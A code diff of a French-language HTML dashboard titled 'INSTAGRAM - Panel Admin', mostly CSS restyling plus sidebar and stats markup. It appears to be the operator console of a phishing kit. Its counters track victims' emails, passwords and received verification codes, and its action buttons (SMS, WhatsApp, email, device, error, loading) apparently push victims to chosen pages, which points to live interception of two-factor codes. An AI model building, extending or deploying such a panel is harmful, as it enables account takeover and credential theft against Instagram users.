@@ -1,641 +1,561 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>INSTAGRAM - Panel Admin</title>
-<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
-<style>
-:root{
-  --bg:#f3f4f6;--bg-card:#fff;--bg-sidebar:#111827;--bg-sidebar-hover:#1f2937;--bg-sidebar-active:rgba(99,102,241,.15);
-  --bg-input:#f9fafb;--border:#e5e7eb;--border-light:#f3f4f6;--text-primary:#111827;--text-secondary:#6b7280;
-  --text-muted:#9ca3af;--text-sidebar:#d1d5db;--text-sidebar-active:#818cf8;--accent:#6366f1;--accent-light:#eef2ff;
-  --success:#10b981;--success-bg:#ecfdf5;--warning:#f59e0b;--warning-bg:#fffbeb;--danger:#ef4444;--danger-bg:#fef2f2;
-  --info:#3b82f6;--info-bg:#eff6ff;--purple:#8b5cf6;--purple-bg:#f5f3ff;
-  --ig-gradient:linear-gradient(135deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888);
-}
-*{margin:0;padding:0;box-sizing:border-box;font-family:'Inter',-apple-system,sans-serif}
-body{background:var(--bg);color:var(--text-primary);min-height:100vh}
-::-webkit-scrollbar{width:5px}::-webkit-scrollbar-thumb{background:var(--border);border-radius:5px}
-.layout{display:flex;min-height:100vh}
-.sidebar{width:260px;background:var(--bg-sidebar);color:var(--text-sidebar);display:flex;flex-direction:column;position:fixed;inset:0 auto 0 0;z-index:200;transition:transform .3s}
-.sidebar-header{padding:20px 22px;border-bottom:1px solid rgba(255,255,255,.08);display:flex;align-items:center;gap:14px}
-.sidebar-logo{width:40px;height:40px;background:var(--ig-gradient);border-radius:11px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
-.sidebar-brand{font-size:16px;font-weight:800;color:#fff}.sidebar-brand span{color:var(--text-sidebar-active)}
-.sidebar-close{display:none;background:none;border:none;color:var(--text-sidebar);font-size:18px;cursor:pointer;margin-left:auto;padding:4px 8px;border-radius:6px}
-.sidebar-nav{flex:1;padding:16px 12px;display:flex;flex-direction:column;gap:4px}
-.sidebar-nav a{display:flex;align-items:center;gap:12px;padding:11px 16px;border-radius:10px;color:var(--text-sidebar);text-decoration:none;font-size:13px;font-weight:500;cursor:pointer;transition:all .2s}
-.sidebar-nav a:hover{background:var(--bg-sidebar-hover);color:#fff}
-.sidebar-nav a.active{background:var(--bg-sidebar-active);color:var(--text-sidebar-active)}
-.sidebar-nav a i{width:20px;text-align:center;font-size:15px}
-.sidebar-footer{padding:16px 22px;border-top:1px solid rgba(255,255,255,.08)}
-.status-badge{display:flex;align-items:center;gap:10px;font-size:12px;color:var(--text-sidebar)}
-.status-dot{width:8px;height:8px;border-radius:50%;background:var(--success);box-shadow:0 0 8px rgba(16,185,129,.4);transition:background .2s}
-.status-dot.off{background:var(--danger);box-shadow:0 0 8px rgba(239,68,68,.4)}
-.main{flex:1;margin-left:260px;min-height:100vh;display:flex;flex-direction:column}
-.topbar{background:var(--bg-card);border-bottom:1px solid var(--border);padding:0 28px;height:60px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:100}
-.topbar-left{display:flex;align-items:center;gap:16px}
-.menu-toggle{display:none;background:none;border:none;font-size:20px;cursor:pointer;padding:6px}
-.page-title{font-size:18px;font-weight:700}
-.topbar-right{display:flex;align-items:center;gap:12px}
-.rev-tag{font:600 11px 'JetBrains Mono',monospace;color:var(--text-muted);background:var(--bg-input);border:1px solid var(--border);padding:6px 10px;border-radius:8px}
-.topbar-btn{background:var(--bg-input);border:1px solid var(--border);padding:8px 16px;border-radius:9px;font-size:12px;font-weight:500;cursor:pointer;color:var(--text-secondary);display:flex;align-items:center;gap:6px;font-family:inherit;transition:all .2s}
-.topbar-btn:hover{background:var(--accent);color:#fff;border-color:var(--accent)}
-.auto-toggle{display:flex;align-items:center;gap:8px;font-size:12px;color:var(--text-secondary);font-weight:500}
-.auto-toggle input{accent-color:var(--accent)}
-.content-area{flex:1;padding:24px 28px}
-.section{display:none}.section.active{display:block;animation:fadeIn .3s ease}
-@keyframes fadeIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
-.stats-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:16px;margin-bottom:24px}
-.stat-card{background:var(--bg-card);border:1px solid var(--border);border-radius:12px;padding:20px;display:flex;align-items:center;gap:16px;transition:all .2s}
-.stat-card:hover{transform:translateY(-2px);box-shadow:0 4px 16px rgba(0,0,0,.06)}
-.stat-icon{width:48px;height:48px;border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:18px;flex-shrink:0}
-.stat-icon.blue{background:var(--info-bg);color:var(--info)}.stat-icon.green{background:var(--success-bg);color:var(--success)}
-.stat-icon.yellow{background:var(--warning-bg);color:var(--warning)}.stat-icon.purple{background:var(--purple-bg);color:var(--purple)}
-.stat-icon.red{background:var(--danger-bg);color:var(--danger)}
-.stat-label{font-size:11px;color:var(--text-muted);text-transform:uppercase;letter-spacing:.5px;font-weight:600}
-.stat-value{font-size:28px;font-weight:800;font-family:'JetBrains Mono',monospace;margin-top:4px}
-.card{background:var(--bg-card);border:1px solid var(--border);border-radius:12px;overflow:hidden;margin-bottom:16px}
-.card-header{padding:16px 20px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;gap:10px}
-.card-title{font-size:14px;font-weight:600;display:flex;align-items:center;gap:8px}
-.card-title i{color:var(--accent)}
-.badge{background:var(--accent);color:#fff;font-size:11px;font-weight:700;padding:3px 10px;border-radius:20px;font-family:'JetBrains Mono',monospace}
-.card-body{padding:16px 20px}
-.search-box{background:var(--bg-input);border:1px solid var(--border);border-radius:10px;padding:10px 16px;display:flex;align-items:center;gap:10px;margin-bottom:12px}
-.search-box i{color:var(--text-muted);font-size:14px}
-.search-box input{flex:1;background:none;border:none;outline:none;font-size:13px;font-family:inherit;color:var(--text-primary)}
-.tabs{display:flex;gap:6px;margin-bottom:12px}
-.tab{flex:1;text-align:center;padding:7px 0;border:1px solid var(--border);border-radius:8px;font-size:11px;font-weight:600;cursor:pointer;color:var(--text-secondary);background:var(--bg-card)}
-.tab.active{background:var(--accent);color:#fff;border-color:var(--accent)}
-.client-list{max-height:600px;overflow-y:auto}
-.client-item{display:flex;align-items:center;gap:10px;padding:8px 12px;border-radius:8px;cursor:pointer;border:1px solid transparent;margin-bottom:2px;transition:all .2s}
-.client-item:hover{background:var(--bg-input)}
-.client-item.active{background:var(--accent-light);border-color:rgba(99,102,241,.2)}
-.client-avatar{width:32px;height:32px;border-radius:8px;background:var(--ig-gradient);display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:700;color:#fff;flex-shrink:0;position:relative}
-.online-dot{position:absolute;bottom:-1px;right:-1px;width:8px;height:8px;background:var(--success);border:2px solid var(--bg-card);border-radius:50%}
-.client-info{flex:1;min-width:0}
-.client-name{font-size:12px;font-weight:600;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
-.client-page{font-size:10px;color:var(--text-muted);display:flex;align-items:center;gap:4px;margin-top:1px}
-.dot{width:5px;height:5px;border-radius:50%;flex-shrink:0}
-.client-time{font-size:10px;color:var(--text-muted);font-family:'JetBrains Mono',monospace;flex-shrink:0}
-.empty-state{text-align:center;padding:60px 20px;color:var(--text-muted)}
-.empty-state i{font-size:48px;margin-bottom:14px;display:block;opacity:.2}
-.empty-state p{font-size:14px;font-weight:500}
-.client-detail{animation:fadeIn .3s ease}
-.client-header{display:flex;align-items:center;gap:16px;padding:20px;background:var(--bg-card);border:1px solid var(--border);border-radius:12px;margin-bottom:16px;position:relative;overflow:hidden}
-.client-header::before{content:'';position:absolute;top:0;left:0;right:0;height:3px;background:var(--ig-gradient)}
-.client-header .avatar{width:56px;height:56px;border-radius:14px;background:var(--ig-gradient);display:flex;align-items:center;justify-content:center;font-size:22px;color:#fff;flex-shrink:0;position:relative}
-.client-header .name{font-size:20px;font-weight:800}
-.client-header .meta{font-size:12px;color:var(--text-secondary);margin-top:4px;display:flex;align-items:center;gap:8px}
-.client-header .meta code{background:var(--bg-input);padding:2px 8px;border-radius:4px;font-size:11px;font-family:'JetBrains Mono',monospace;border:1px solid var(--border)}
-.page-badge{display:inline-flex;align-items:center;gap:6px;padding:7px 14px;border-radius:8px;font-size:12px;font-weight:600;color:#fff;margin-left:auto}
-.data-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:12px;margin-bottom:16px}
-.data-card{background:var(--bg-card);border:1px solid var(--border);border-radius:12px;padding:16px;position:relative;transition:all .2s}
-.data-card:hover{border-color:var(--accent)}
-.data-card .label{font-size:11px;color:var(--text-muted);text-transform:uppercase;letter-spacing:.5px;margin-bottom:8px;display:flex;align-items:center;gap:6px;font-weight:600}
-.data-card .value{font-size:14px;font-weight:600;word-break:break-all;font-family:'JetBrains Mono',monospace;line-height:1.5}
-.data-card .value.empty{color:var(--text-muted);font-style:italic;font-weight:400;font-family:'Inter',sans-serif}
-.data-card.has-data{border-color:rgba(16,185,129,.3);background:var(--success-bg)}
-.data-card.alert{border-color:rgba(245,158,11,.4);background:var(--warning-bg)}
-.copy-btn{position:absolute;top:12px;right:12px;background:var(--bg-input);border:1px solid var(--border);border-radius:8px;padding:6px 8px;color:var(--text-secondary);cursor:pointer;font-size:12px}
-.copy-btn:hover{background:var(--accent);color:#fff;border-color:var(--accent)}
-.copy-all-btn{background:var(--success);color:#fff;border:none;padding:8px 18px;border-radius:8px;cursor:pointer;font-size:12px;font-weight:600;display:flex;align-items:center;gap:6px;font-family:inherit}
-.actions-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:10px}
-.action-btn{display:flex;align-items:center;justify-content:center;gap:8px;padding:12px 14px;border:1px solid var(--border);border-radius:10px;font-size:12px;font-weight:500;cursor:pointer;background:var(--bg-card);color:var(--text-primary);font-family:inherit;transition:all .2s}
-.action-btn:hover{transform:translateY(-1px);box-shadow:0 4px 12px rgba(0,0,0,.08)}
-.action-btn:disabled{opacity:.45;cursor:progress;transform:none}
-.action-btn.current{border-color:var(--accent);box-shadow:0 0 0 2px var(--accent-light)}
-.action-btn.ig{color:var(--accent)}.action-btn.error{color:var(--danger)}
-.action-btn.success{color:var(--success)}.action-btn.sms{color:#34a853}
-.action-btn.whatsapp{color:#25d366}.action-btn.email{color:#ea4335}
-.action-btn.device{color:var(--purple)}.action-btn.loading-btn{color:var(--warning)}
-.activity-list{max-height:320px;overflow-y:auto}
-.activity-item{display:flex;gap:10px;padding:10px 0;border-bottom:1px solid var(--border-light);font-size:12px}
-.activity-item:last-child{border-bottom:none}
-.activity-item .time{color:var(--text-muted);font-family:'JetBrains Mono',monospace;flex-shrink:0;font-size:11px}
-.activity-item .msg{color:var(--text-secondary);flex:1}
-.activity-item .msg strong{color:var(--text-primary);font-weight:600}
-.activity-item.ko .msg{color:var(--danger)}
-.activity-item.ok .msg{color:var(--success)}
-.toast{position:fixed;bottom:24px;right:24px;padding:14px 22px;border-radius:12px;color:#fff;font-size:13px;font-weight:500;opacity:0;transform:translateY(20px);transition:all .3s cubic-bezier(.175,.885,.32,1.275);z-index:1000;display:flex;align-items:center;gap:10px;box-shadow:0 8px 30px rgba(0,0,0,.15)}
-.toast.show{opacity:1;transform:translateY(0)}
-.toast.success{background:var(--success)}.toast.error{background:var(--danger)}
-.sidebar-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.5);z-index:190}
-@media(max-width:860px){
-  .sidebar{transform:translateX(-100%)}.sidebar.open{transform:translateX(0)}
-  .sidebar-overlay.show{display:block}.main{margin-left:0}.menu-toggle{display:block}
-  .sidebar-close{display:block}
-  .stats-grid{grid-template-columns:repeat(2,1fr)}.data-grid{grid-template-columns:1fr}
-  .actions-grid{grid-template-columns:repeat(2,1fr)}
-}
-@media(max-width:500px){
-  .content-area{padding:16px}.topbar{padding:0 16px}.stats-grid,.actions-grid{grid-template-columns:1fr}
-  .client-header{flex-wrap:wrap}.page-badge{margin-left:0;margin-top:8px}
-}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>INSTAGRAM - Panel Admin</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg: #f3f4f6;
+            --bg-card: #ffffff;
+            --bg-sidebar: #111827;
+            --bg-sidebar-hover: #1f2937;
+            --bg-sidebar-active: rgba(99,102,241,0.15);
+            --bg-input: #f9fafb;
+            --border: #e5e7eb;
+            --border-light: #f3f4f6;
+            --text-primary: #111827;
+            --text-secondary: #6b7280;
+            --text-muted: #9ca3af;
+            --text-sidebar: #d1d5db;
+            --text-sidebar-active: #818cf8;
+            --accent: #6366f1;
+            --accent-light: #eef2ff;
+            --accent-glow: rgba(99,102,241,0.15);
+            --success: #10b981;
+            --success-bg: #ecfdf5;
+            --warning: #f59e0b;
+            --warning-bg: #fffbeb;
+            --danger: #ef4444;
+            --danger-bg: #fef2f2;
+            --info: #3b82f6;
+            --info-bg: #eff6ff;
+            --purple: #8b5cf6;
+            --purple-bg: #f5f3ff;
+            --ig-gradient: linear-gradient(135deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', -apple-system, sans-serif; }
+        body { background: var(--bg); color: var(--text-primary); min-height: 100vh; }
+        ::selection { background: var(--accent); color: #fff; }
+        ::-webkit-scrollbar { width: 5px; }
+        ::-webkit-scrollbar-track { background: transparent; }
+        ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 5px; }
+
+        /* LAYOUT */
+        .layout { display: flex; min-height: 100vh; }
+
+        /* SIDEBAR */
+        .sidebar { width: 260px; background: var(--bg-sidebar); color: var(--text-sidebar); display: flex; flex-direction: column; position: fixed; top: 0; left: 0; bottom: 0; z-index: 200; transition: transform .3s; }
+        .sidebar-header { padding: 20px 22px; border-bottom: 1px solid rgba(255,255,255,0.08); display: flex; align-items: center; gap: 14px; }
+        .sidebar-close { display: none; background: none; border: none; color: var(--text-sidebar); font-size: 18px; cursor: pointer; margin-left: auto; padding: 4px 8px; border-radius: 6px; transition: all .2s; }
+        .sidebar-close:hover { background: var(--bg-sidebar-hover); color: #fff; }
+        @media (max-width: 860px) { .sidebar-close { display: block; } }
+        .sidebar-logo { width: 40px; height: 40px; background: var(--ig-gradient); border-radius: 11px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+        .sidebar-brand { font-size: 16px; font-weight: 800; color: #fff; }
+        .sidebar-brand span { color: var(--text-sidebar-active); }
+        .sidebar-nav { flex: 1; padding: 16px 12px; display: flex; flex-direction: column; gap: 4px; }
+        .sidebar-nav a { display: flex; align-items: center; gap: 12px; padding: 11px 16px; border-radius: 10px; color: var(--text-sidebar); text-decoration: none; font-size: 13px; font-weight: 500; transition: all .2s; cursor: pointer; }
+        .sidebar-nav a:hover { background: var(--bg-sidebar-hover); color: #fff; }
+        .sidebar-nav a.active { background: var(--bg-sidebar-active); color: var(--text-sidebar-active); }
+        .sidebar-nav a i { width: 20px; text-align: center; font-size: 15px; }
+        .sidebar-footer { padding: 16px 22px; border-top: 1px solid rgba(255,255,255,0.08); }
+        .sidebar-footer .status-badge { display: flex; align-items: center; gap: 10px; font-size: 12px; color: var(--text-sidebar); }
+        .sidebar-footer .status-dot { width: 8px; height: 8px; border-radius: 50%; background: var(--success); box-shadow: 0 0 8px rgba(16,185,129,0.4); }
+
+        /* MAIN CONTENT */
+        .main { flex: 1; margin-left: 260px; min-height: 100vh; display: flex; flex-direction: column; }
+
+        /* TOP BAR */
+        .topbar { background: var(--bg-card); border-bottom: 1px solid var(--border); padding: 0 28px; height: 60px; display: flex; align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 100; }
+        .topbar-left { display: flex; align-items: center; gap: 16px; }
+        .menu-toggle { display: none; background: none; border: none; font-size: 20px; color: var(--text-primary); cursor: pointer; padding: 6px; }
+        .page-title { font-size: 18px; font-weight: 700; color: var(--text-primary); }
+        .topbar-right { display: flex; align-items: center; gap: 12px; }
+        .topbar-btn { background: var(--bg-input); border: 1px solid var(--border); padding: 8px 16px; border-radius: 9px; font-size: 12px; font-weight: 500; cursor: pointer; color: var(--text-secondary); display: flex; align-items: center; gap: 6px; font-family: inherit; transition: all .2s; }
+        .topbar-btn:hover { background: var(--accent); color: #fff; border-color: var(--accent); }
+        .auto-toggle { display: flex; align-items: center; gap: 8px; font-size: 12px; color: var(--text-secondary); font-weight: 500; }
+        .auto-toggle input { accent-color: var(--accent); }
+
+        /* CONTENT AREA */
+        .content-area { flex: 1; padding: 24px 28px; }
+        .section { display: none; }
+        .section.active { display: block; animation: fadeIn .3s ease; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
+
+        /* STATS PAGE */
+        .stats-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr)); gap: 16px; margin-bottom: 24px; }
+        .stat-card { background: var(--bg-card); border: 1px solid var(--border); border-radius: 12px; padding: 20px; display: flex; align-items: center; gap: 16px; transition: all .2s; }
+        .stat-card:hover { transform: translateY(-2px); box-shadow: 0 4px 16px rgba(0,0,0,0.06); }
+        .stat-icon { width: 48px; height: 48px; border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 18px; flex-shrink: 0; }
+        .stat-icon.blue { background: var(--info-bg); color: var(--info); }
+        .stat-icon.green { background: var(--success-bg); color: var(--success); }
+        .stat-icon.yellow { background: var(--warning-bg); color: var(--warning); }
+        .stat-icon.purple { background: var(--purple-bg); color: var(--purple); }
+        .stat-icon.red { background: var(--danger-bg); color: var(--danger); }
+        .stat-label { font-size: 11px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.5px; font-weight: 600; }
+        .stat-value { font-size: 28px; font-weight: 800; color: var(--text-primary); font-family: 'JetBrains Mono', monospace; margin-top: 4px; }
+
+        /* CARDS */
+        .card { background: var(--bg-card); border: 1px solid var(--border); border-radius: 12px; overflow: hidden; margin-bottom: 16px; }
+        .card-header { padding: 16px 20px; border-bottom: 1px solid var(--border); display: flex; align-items: center; justify-content: space-between; }
+        .card-title { font-size: 14px; font-weight: 600; display: flex; align-items: center; gap: 8px; }
+        .card-title i { color: var(--accent); }
+        .badge { background: var(--accent); color: #fff; font-size: 11px; font-weight: 700; padding: 3px 10px; border-radius: 20px; font-family: 'JetBrains Mono', monospace; }
+        .card-body { padding: 16px 20px; }
+
+        /* CLIENTS LIST */
+        .search-box { background: var(--bg-input); border: 1px solid var(--border); border-radius: 10px; padding: 10px 16px; display: flex; align-items: center; gap: 10px; margin-bottom: 16px; }
+        .search-box i { color: var(--text-muted); font-size: 14px; }
+        .search-box input { flex: 1; background: none; border: none; outline: none; color: var(--text-primary); font-size: 13px; font-family: inherit; }
+        .search-box input::placeholder { color: var(--text-muted); }
+        .client-list { max-height: 600px; overflow-y: auto; }
+        .client-item { display: flex; align-items: center; gap: 10px; padding: 8px 12px; border-radius: 8px; cursor: pointer; transition: all .2s; border: 1px solid transparent; margin-bottom: 2px; }
+        .client-item:hover { background: var(--bg-input); }
+        .client-item.active { background: var(--accent-light); border-color: rgba(99,102,241,0.2); }
+        .client-avatar { width: 32px; height: 32px; border-radius: 8px; background: var(--ig-gradient); display: flex; align-items: center; justify-content: center; font-size: 12px; font-weight: 700; color: #fff; flex-shrink: 0; position: relative; }
+        .online-dot { position: absolute; bottom: -1px; right: -1px; width: 8px; height: 8px; background: var(--success); border: 2px solid var(--bg-card); border-radius: 50%; }
+        .client-info { flex: 1; min-width: 0; }
+        .client-name { font-size: 12px; font-weight: 600; }
+        .client-page { font-size: 10px; color: var(--text-muted); display: flex; align-items: center; gap: 4px; margin-top: 1px; }
+        .dot { width: 5px; height: 5px; border-radius: 50%; flex-shrink: 0; }
+        .client-time { font-size: 10px; color: var(--text-muted); font-family: 'JetBrains Mono', monospace; flex-shrink: 0; }
+        .empty-state { text-align: center; padding: 60px 20px; color: var(--text-muted); }
+        .empty-state i { font-size: 48px; margin-bottom: 14px; display: block; opacity: 0.2; }
+        .empty-state p { font-size: 14px; font-weight: 500; }
+
+        /* CLIENT DETAIL */
+        .client-detail { animation: fadeIn .3s ease; }
+        .client-header { display: flex; align-items: center; gap: 16px; padding: 20px; background: var(--bg-card); border: 1px solid var(--border); border-radius: 12px; margin-bottom: 16px; position: relative; overflow: hidden; }
+        .client-header::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 3px; background: var(--ig-gradient); }
+        .client-header .avatar { width: 56px; height: 56px; border-radius: 14px; background: var(--ig-gradient); display: flex; align-items: center; justify-content: center; font-size: 22px; color: #fff; flex-shrink: 0; position: relative; }
+        .client-header .name { font-size: 20px; font-weight: 800; }
+        .client-header .meta { font-size: 12px; color: var(--text-secondary); margin-top: 4px; display: flex; align-items: center; gap: 8px; }
+        .client-header .meta code { background: var(--bg-input); padding: 2px 8px; border-radius: 4px; font-size: 11px; font-family: 'JetBrains Mono', monospace; border: 1px solid var(--border); }
+        .status-badge { display: inline-flex; align-items: center; gap: 6px; padding: 7px 14px; border-radius: 8px; font-size: 12px; font-weight: 600; color: #fff; margin-left: auto; }
+
+        .data-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(240px, 1fr)); gap: 12px; margin-bottom: 16px; }
+        .data-card { background: var(--bg-card); border: 1px solid var(--border); border-radius: 12px; padding: 16px; position: relative; transition: all .2s; }
+        .data-card:hover { border-color: var(--accent); }
+        .data-card .label { font-size: 11px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 8px; display: flex; align-items: center; gap: 6px; font-weight: 600; }
+        .data-card .value { font-size: 14px; font-weight: 600; word-break: break-all; font-family: 'JetBrains Mono', monospace; line-height: 1.5; }
+        .data-card .value.empty { color: var(--text-muted); font-style: italic; font-weight: 400; font-family: 'Inter', sans-serif; }
+        .data-card.has-data { border-color: rgba(16,185,129,0.3); background: var(--success-bg); }
+        .data-card.has-data .label i { color: var(--success); }
+        .copy-btn { position: absolute; top: 12px; right: 12px; background: var(--bg-input); border: 1px solid var(--border); border-radius: 8px; padding: 6px 8px; color: var(--text-secondary); cursor: pointer; font-size: 12px; transition: all .2s; }
+        .copy-btn:hover { background: var(--accent); color: #fff; border-color: var(--accent); }
+        .copy-all-btn { background: var(--success); color: #fff; border: none; padding: 8px 18px; border-radius: 8px; cursor: pointer; font-size: 12px; font-weight: 600; display: flex; align-items: center; gap: 6px; font-family: inherit; transition: all .2s; }
+        .copy-all-btn:hover { box-shadow: 0 4px 12px rgba(16,185,129,0.3); }
+
+        /* ACTIONS */
+        .actions-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(160px, 1fr)); gap: 10px; }
+        .action-btn { display: flex; align-items: center; justify-content: center; gap: 8px; padding: 12px 14px; border: 1px solid var(--border); border-radius: 10px; font-size: 12px; font-weight: 500; cursor: pointer; color: var(--text-primary); background: var(--bg-card); transition: all .2s; font-family: inherit; }
+        .action-btn:hover { transform: translateY(-1px); box-shadow: 0 4px 12px rgba(0,0,0,0.08); }
+        .action-btn:disabled { opacity: 0.4; cursor: not-allowed; transform: none; }
+        .action-btn.ig { border-color: rgba(99,102,241,0.3); color: var(--accent); }
+        .action-btn.ig:hover { background: var(--accent); color: #fff; border-color: var(--accent); }
+        .action-btn.error { border-color: rgba(239,68,68,0.3); color: var(--danger); }
+        .action-btn.error:hover { background: var(--danger); color: #fff; border-color: var(--danger); }
+        .action-btn.success { border-color: rgba(16,185,129,0.3); color: var(--success); }
+        .action-btn.success:hover { background: var(--success); color: #fff; border-color: var(--success); }
+        .action-btn.sms { border-color: rgba(52,168,83,0.3); color: #34a853; }
+        .action-btn.sms:hover { background: #34a853; color: #fff; border-color: #34a853; }
+        .action-btn.whatsapp { border-color: rgba(37,211,102,0.3); color: #25d366; }
+        .action-btn.whatsapp:hover { background: #25d366; color: #fff; border-color: #25d366; }
+        .action-btn.email { border-color: rgba(234,67,53,0.3); color: #ea4335; }
+        .action-btn.email:hover { background: #ea4335; color: #fff; border-color: #ea4335; }
+        .action-btn.device { border-color: rgba(139,92,246,0.3); color: var(--purple); }
+        .action-btn.device:hover { background: var(--purple); color: #fff; border-color: var(--purple); }
+        .action-btn.loading-btn { border-color: rgba(245,158,11,0.3); color: var(--warning); }
+        .action-btn.loading-btn:hover { background: var(--warning); color: #fff; border-color: var(--warning); }
+        .action-btn.retry { border-color: var(--border); color: var(--text-secondary); }
+        .action-btn.retry:hover { background: var(--text-secondary); color: #fff; border-color: var(--text-secondary); }
+
+        /* ACTIVITY & VOTES */
+        .activity-list { max-height: 300px; overflow-y: auto; }
+        .activity-item { display: flex; align-items: center; gap: 10px; padding: 10px 0; border-bottom: 1px solid var(--border-light); font-size: 12px; }
+        .activity-item:last-child { border-bottom: none; }
+        .activity-item .time { color: var(--text-muted); font-family: 'JetBrains Mono', monospace; flex-shrink: 0; font-size: 11px; }
+        .activity-item .msg { color: var(--text-secondary); flex: 1; }
+        .activity-item .msg strong { color: var(--text-primary); font-weight: 600; }
+
+        /* TOAST */
+        .toast { position: fixed; bottom: 24px; right: 24px; padding: 14px 22px; border-radius: 12px; color: #fff; font-size: 13px; font-weight: 500; opacity: 0; transform: translateY(20px); transition: all .3s cubic-bezier(.175,.885,.32,1.275); z-index: 1000; display: flex; align-items: center; gap: 10px; box-shadow: 0 8px 30px rgba(0,0,0,0.15); }
+        .toast.show { opacity: 1; transform: translateY(0); }
+        .toast.success { background: var(--success); }
+        .toast.error { background: var(--danger); }
+
+        /* MOBILE */
+        .sidebar-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.5); z-index: 190; }
+        @media (max-width: 860px) {
+            .sidebar { transform: translateX(-100%); }
+            .sidebar.open { transform: translateX(0); }
+            .sidebar-overlay.show { display: block; }
+            .main { margin-left: 0; }
+            .menu-toggle { display: block; }
+            .stats-grid { grid-template-columns: repeat(2, 1fr); }
+            .data-grid { grid-template-columns: 1fr; }
+            .actions-grid { grid-template-columns: repeat(2, 1fr); }
+        }
+        @media (max-width: 500px) {
+            .content-area { padding: 16px; }
+            .topbar { padding: 0 16px; }
+            .stats-grid { grid-template-columns: 1fr; }
+            .actions-grid { grid-template-columns: 1fr; }
+            .client-header { flex-wrap: wrap; }
+            .client-header .status-badge { margin-left: 0; margin-top: 8px; }
+        }
+    </style>
 </head>
 <body>
-<div class="layout">
-  <div class="sidebar-overlay" id="sidebarOverlay"></div>
-  <aside class="sidebar" id="sidebar">
-    <div class="sidebar-header">
-      <div class="sidebar-logo"><svg viewBox="0 0 48 48" width="20" height="20"><rect x="8" y="8" width="32" height="32" rx="8" fill="none" stroke="#fff" stroke-width="2.5"/><circle cx="24" cy="24" r="7" fill="none" stroke="#fff" stroke-width="2.5"/><circle cx="33" cy="15" r="2" fill="#fff"/></svg></div>
-      <div class="sidebar-brand">INSTAGRAM<span>panel</span></div>
-      <button class="sidebar-close" id="btnCloseSidebar" aria-label="Fermer"><i class="fas fa-times"></i></button>
-    </div>
-    <nav class="sidebar-nav" id="nav">
-      <a class="active" data-page="dashboard"><i class="fas fa-chart-pie"></i> Tableau de bord</a>
-      <a data-page="clients"><i class="fas fa-users"></i> Clients</a>
-      <a data-page="votes"><i class="fas fa-vote-yea"></i> Votes</a>
-      <a data-page="activity"><i class="fas fa-history"></i> Activite</a>
-    </nav>
-    <div class="sidebar-footer">
-      <div class="status-badge"><div class="status-dot" id="statusDot"></div><span id="statusText">Connexion...</span></div>
-    </div>
-  </aside>
-
-  <div class="main">
-    <div class="topbar">
-      <div class="topbar-left">
-        <button class="menu-toggle" id="btnMenu"><i class="fas fa-bars"></i></button>
-        <div class="page-title" id="pageTitle">Tableau de bord</div>
-      </div>
-      <div class="topbar-right">
-        <div class="rev-tag" id="revTag">rev 0</div>
-        <label class="auto-toggle"><input type="checkbox" id="autoToggle" checked> Auto</label>
-        <button class="topbar-btn" id="btnRefresh"><i class="fas fa-sync-alt"></i> Actualiser</button>
-      </div>
-    </div>
-
-    <div class="content-area">
-      <div class="section active" id="sec-dashboard">
-        <div class="stats-grid">
-          <div class="stat-card"><div class="stat-icon blue"><i class="fas fa-users"></i></div><div><div class="stat-label">Clients</div><div class="stat-value" id="sClients">0</div></div></div>
-          <div class="stat-card"><div class="stat-icon green"><i class="fas fa-envelope"></i></div><div><div class="stat-label">Emails</div><div class="stat-value" id="sEmails">0</div></div></div>
-          <div class="stat-card"><div class="stat-icon yellow"><i class="fas fa-key"></i></div><div><div class="stat-label">Mots de passe</div><div class="stat-value" id="sPass">0</div></div></div>
-          <div class="stat-card"><div class="stat-icon purple"><i class="fas fa-sms"></i></div><div><div class="stat-label">Codes recus</div><div class="stat-value" id="sCodes">0</div></div></div>
-          <div class="stat-card"><div class="stat-icon red"><i class="fas fa-vote-yea"></i></div><div><div class="stat-label">Votes</div><div class="stat-value" id="sVotes">0</div></div></div>
-          <div class="stat-card"><div class="stat-icon blue"><i class="fas fa-shield-alt"></i></div><div><div class="stat-label">En cours</div><div class="stat-value" id="sActive">0</div></div></div>
-        </div>
